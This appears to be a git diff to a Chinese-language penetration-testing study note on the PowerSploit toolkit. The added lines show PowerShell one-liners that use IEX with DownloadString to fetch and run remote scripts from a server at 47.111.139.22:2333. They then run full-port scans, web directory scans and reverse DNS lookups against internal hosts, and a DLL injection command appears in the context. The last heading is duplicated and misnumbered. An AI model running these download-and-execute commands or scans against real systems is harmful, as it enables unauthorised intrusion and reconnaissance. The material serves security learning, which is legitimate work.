@@ -4637,7 +4637,7 @@ git clone https://github.com/PowerShellMafia/PowerSploit
 | ScriptModification | 在目标主机上**创建或修改脚本**       |
 | Privesc            | 在目标主机中用于**提权**             |
 
-
+下面的模块演示参考：https://www.freebuf.com/column/171993.html
 
 
 
@@ -4737,29 +4737,51 @@ Invoke-DllInjection -Dll .\code.dll -ProcessID 3552
 IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-Portscan.ps1")
 ```
 
+PowerShell执行
+
+```
+Invoke-Portscan -Hosts 192.168.52.143 -Ports "1-65535"
+```
+
 **注意：这里用的全端口扫描，不建议这么做，耗费时间太长，可以扫描一些常规端口**
 
 
 
+##### b) 调用Get-HttpStatus扫描目标站点的目录
+
+通过IEX下载并调用Get-HttpStatus
+
+```
+IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Get-HttpStatus.ps1")
+```
+
+PowerShell执行
+
+```
+Get-HttpStatus -Target 192.168.52.141 -Path C:\Users\Adminnistrator\Desktop\generic.txt
+```
+
+![s21.png](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/15264566911137.png!small)
 
 
 
+##### c) 调用Invoke-ReverseDnsLookup扫描内网主机的ip对应的主机名
+
+通过IEX下载并调用Invoke-ReverseDnsLookup
+
+```
+IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1")
+```
+
+PowerShell执行
+
+```
+Invoke-ReverseDnsLookup '192.168.52.141'
+```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+d) 调用Invoke-ReverseDnsLookup扫描内网主机的ip对应的主机名
 
 
 
